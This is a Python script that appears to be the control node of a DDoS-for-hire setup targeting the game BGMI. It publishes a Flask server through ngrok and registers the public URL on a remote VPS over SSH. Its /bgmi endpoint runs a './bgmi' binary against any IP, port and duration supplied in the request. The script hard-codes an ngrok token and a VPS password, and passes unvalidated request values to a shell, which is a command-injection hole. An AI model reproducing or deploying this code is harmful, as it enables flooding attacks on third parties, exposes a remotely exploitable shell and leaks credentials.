import os
import subprocess
import threading
from flask import Flask, request, jsonify, send_from_directory
from pyngrok import ngrok
import paramiko

def install_packages():
    required_packages = ['Flask', 'pyngrok', 'paramiko']
    for package in required_packages:
        try:
            subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'show', package])
        except subprocess.CalledProcessError:
            try:
                subprocess.check_call([f'{os.sys.executable}', '-m', 'pip', 'install', package])
                print(f"{package} installed successfully.")
            except subprocess.CalledProcessError:
                print(f"Failed to install {package}.")

def configure_ngrok():
    ngrok_token = "2luI8I6Mea0rekhWxPlfAdHKVwN_6j1FfSooubZCWPbCxsXDU"
    try:
        ngrok.set_auth_token(ngrok_token)
        print("ngrok token configured successfully.")
    except Exception as e:
        print(f"Failed to configure ngrok: {str(e)}")

def update_soul_txt(public_url):
    with open("xnxx1.txt", "w") as file:
        file.write(public_url)
    print(f"New ngrok link saved in xnxx1.txt")

def update_vps_soul_txt(public_url):
    vps_ip = "194.238.17.134"
    vps_user = "ubuntu"
    vps_password = "soulKing90121"

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps_ip, username=vps_user, password=vps_password)
        sftp = ssh.open_sftp()
        with sftp.open("xnxx1.txt", "w") as file:
            file.write(public_url)
        sftp.close()
        ssh.close()
        print("Updated xnxx1.txt on VPS successfully.")
    except Exception as e:
        print(f"Failed to update xnxx1.txt on VPS: {str(e)}")

def execute_command_async(command, duration):
    def run():
        try:
            result = subprocess.run(command, shell=True, text=True, capture_output=True)
            print(f"Command executed: {command}")
            print(f"Output: {result.stdout}")
        except Exception as e:
            print(f"Error executing command: {str(e)}")

    thread = threading.Thread(target=run)
    thread.start()
    return {"status": "Command execution started", "duration": duration}

def run_flask_app():
    app = Flask(__name__)

    @app.route('/favicon.ico')
    def favicon():
        return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')

    try:
        public_url_obj = ngrok.connect(5000)
        public_url = public_url_obj.public_url
        print(f"Public URL: {public_url}")

        update_soul_txt(public_url)

        update_vps_soul_txt(public_url)
    except KeyboardInterrupt:
        print("ngrok process was interrupted.")
    except Exception as e:
        print(f"Failed to start ngrok: {str(e)}")

    @app.route('/bgmi', methods=['GET'])
    def bgmi():
        ip = request.args.get('ip')
        port = request.args.get('port')
        time = request.args.get('time')

        if not ip or not port or not time:
            return jsonify({'error': 'Missing parameters'}), 400

        command = f"./bgmi {ip} {port} {time} 70"
        response = execute_command_async(command, time)
        return jsonify(response)

    print("Starting Flask server...")
    app.run(host='0.0.0.0', port=5000)

if __name__ == "__main__":
    install_packages()
    configure_ngrok()
    run_flask_app()
